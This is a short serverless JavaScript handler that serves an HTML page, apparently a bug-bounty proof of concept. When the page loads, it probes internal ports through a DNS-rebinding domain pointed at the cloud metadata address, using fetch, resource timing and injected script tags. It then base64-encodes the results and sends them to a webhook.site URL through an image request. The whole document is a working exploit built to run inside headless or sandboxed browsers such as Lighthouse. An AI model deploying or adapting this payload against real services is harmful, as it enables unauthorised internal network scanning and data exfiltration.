export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>NyxSec High-Accuracy Lab</title></head>
      <body>
        <h1 id="status">Initializing Triple-Protocol...</h1>
        <div id="logs" style="font-family:monospace; font-size:10px;"></div>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
          const rebindBase = "01010101.a9fea9fe.rbndr.us";
          
          // Helper untuk mencatat aktivitas di layar agar Lighthouse tidak NO_FCP
          function log(msg) {
            document.getElementById('logs').innerHTML += "> " + msg + "<br>";
            console.log(msg);
          }

          async function comprehensiveProbe(port) {
            log("Probing Port: " + port);
            const start = Date.now();
            const report = { port, fetchError: null, timing: 0, tagStatus: null };

            // 1. Fetch API (PNA/CORS Check)
            try {
              await fetch("http://" + rebindBase + ":" + port + "/nyxsec", { 
                mode: 'no-cors', 
                cache: 'no-cache',
                priority: 'high'
              });
              report.tagStatus = "Fetch Initiated";
            } catch (e) {
              report.fetchError = e.message;
            }

            // 2. Resource Timing (Micro-precision)
            const entries = performance.getEntriesByName("http://" + rebindBase + ":" + port + "/nyxsec");
            report.timing = entries.length > 0 ? entries[0].duration : (Date.now() - start);

            // 3. Script-Tag Probing (Logic Validation)
            return new Promise((resolve) => {
              const script = document.createElement('script');
              const timer = setTimeout(() => {
                report.tagStatus = "Timeout";
                resolve(report);
              }, 4000); // Timeout lebih pendek agar tidak hang

              script.onerror = () => {
                clearTimeout(timer);
                report.tagStatus = "Error/Blocked";
                resolve(report);
              };
              
              script.onload = () => {
                clearTimeout(timer);
                report.tagStatus = "Success";
                resolve(report);
              };

              script.src = "http://" + rebindBase + ":" + port + "/poc.js?v=" + Math.random();
              document.body.appendChild(script);
            });
          }

          async function runProtocol() {
            // Ditambahkan port baseline (12345, 54321) untuk validasi akurat
            const targets = [9000, 9090, 80, 12345, 54321]; 
            const finalResults = [];

            // Kirim "Ping" awal untuk memastikan webhook aktif
            new Image().src = webhook + "?status=start&id=haza-0xa";

            for(const p of targets) {
              const res = await comprehensiveProbe(p);
              finalResults.push(res);
            }

            log("All probes finished. Sending data...");
            document.getElementById('status').innerText = "Scan Complete.";

            // METODE EXFILTRASI TERKUAT: Gunakan Image Tag untuk mengirim Base64
            // Ini jauh lebih handal daripada fetch() di lingkungan sandboxed
            const b64Data = btoa(JSON.stringify(finalResults));
            const exfil = new Image();
            exfil.src = webhook + "?comprehensive=" + b64Data;
            
            // Berikan waktu bagi peramban untuk mengirim request sebelum halaman ditutup
            setTimeout(() => { log("Finished."); }, 2000);
          }

          runProtocol();
        </script>
      </body>
    </html>
  `);
}
